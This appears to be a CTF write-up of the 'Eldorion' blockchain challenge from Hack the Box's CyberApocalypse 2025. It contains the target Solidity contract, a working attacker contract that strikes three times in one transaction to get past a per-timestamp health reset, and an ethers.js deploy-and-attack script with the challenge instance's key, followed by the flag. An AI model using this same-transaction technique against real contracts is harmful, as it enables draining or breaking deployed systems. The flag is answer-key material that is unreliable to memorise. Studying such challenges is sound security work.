---
published: 2025-04-02
series: CyberApocalypse 2025
tags:
- Blockchain
title: Eldorion

---

As tradition, also this year I joined Hack the Box’s CTF and this was the first blockchain

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}
```

Ok this is easy, basically we need to attack 3 times in the same block, trying as a regular user each transaction will also increase the block count, however a contract can call attack three times before returning, therefore ending un pt in the same transaction

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IEldorion {
    function attack(uint256 damage) external;
    function isDefeated() external view returns (bool);
}

contract EldorionAttacker {
    IEldorion public eldorion;

    constructor(address eldorionAddress) {
        eldorion = IEldorion(eldorionAddress);
    }

    function attack3(uint256 damage) external {
        for (uint256 i = 0; i < 3; i++) {
            eldorion.attack(damage);
            if (eldorion.isDefeated()) {
                break;
            }
        }
    }
}
```

```JavaScript
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');  // Added to fix ReferenceError: path is not defined.
const solc = require('solc');


console.log("Eldorion Attack Script");
// Set up your provider and contract instance
const provider = new ethers.providers.JsonRpcProvider('http://94.237.52.55:57219');
const playerAddress = '0xaE62877f8776fc75014d1091644d150f9DC082e5';
const wallet = new ethers.Wallet('0xad51d5c922ae4e99f75590fcb60e557b99881fc20090403882e35719a146c1be', provider);
const contractAddress = '0x26aceeF087e3B54a5c03aC5eF235AF3f261C4D8c';
const abi = [{"type":"function","name":"attack","inputs":[{"name":"damage","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"health","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"isDefeated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"lastAttackTimestamp","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"event","name":"EldorionDefeated","inputs":[{"name":"slayer","type":"address","indexed":false,"internalType":"address"}],"anonymous":false}];

const contract = new ethers.Contract(contractAddress, abi, wallet);

const check = async () => {
    const blockNumber = await provider.getBlockNumber();
    console.log(`Current block number: ${blockNumber}`);
    const playerBalance = await provider.getBalance(playerAddress);
    console.log(`Player balance: ${playerBalance}`);
    const health = await contract.health();
    console.log(`Eldorion's health: ${health}`);
    const isDefeated = await contract.isDefeated();
    console.log(`Eldorion is defeated: ${isDefeated}`);
    const lastAttackTimestamp = await contract.lastAttackTimestamp();
    console.log(`Last attack timestamp: ${lastAttackTimestamp}`);
}

const attack = async () => {
    await check();
    const tx = await contract.attack(100);
    console.log(`Attack sent: ${tx.hash}`);
    const healthAfterAttack = await contract.health();
    console.log(`Eldorion's health after attack: ${healthAfterAttack}`);
}


// Function to compile Attack.sol using solc-js
const compileContract = (contractFile) => {
    const filePath = path.resolve(__dirname, contractFile);
    const source = fs.readFileSync(filePath, 'utf8');
    const input = {
        language: 'Solidity',
        sources: {
            'Attack.sol': { content: source }
        },
        settings: {
            outputSelection: {
                '*': {
                    '*': ['abi', 'evm.bytecode']
                }
            }
        }
    };
    const output = JSON.parse(solc.compile(JSON.stringify(input)));
    // Assuming contract name is EldorionAttacker
    const contractName = 'EldorionAttacker';
    const contractOutput = output.contracts['Attack.sol'][contractName];
    if (!contractOutput) {
        throw new Error('Compilation failed: Contract EldorionAttacker not found.');
    }
    const compiledAbi = contractOutput.abi;
    const compiledBytecode = "0x" + contractOutput.evm.bytecode.object;
    return { compiledAbi, compiledBytecode };
}

const deployAndAttack = async () => {
    // ABI for the EldorionAttacker contract (only the attack3 function is needed here)
    const { compiledAbi, compiledBytecode } = compileContract('Attack.sol');

    // Create a ContractFactory for the attacker contract.
    const factory = new ethers.ContractFactory(compiledAbi, compiledBytecode, wallet);

    
    // Deploy the contract with the target contract's address as the constructor argument.
    const attackContract = await factory.deploy(contractAddress);
    await attackContract.deployed();
    console.log(`Attack contract deployed at: ${attackContract.address}`);
    
    // Call the attack3 method with a damage value of 100
    const tx = await attackContract.attack3(100);
    console.log(`attack3 transaction sent: ${tx.hash}`);
}

deployAndAttack();
check();
```

the hardest part was realising the last version of ether.js was bugged, same old tradition for every Blockchain CTF, double check your libraries

```Solidity
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```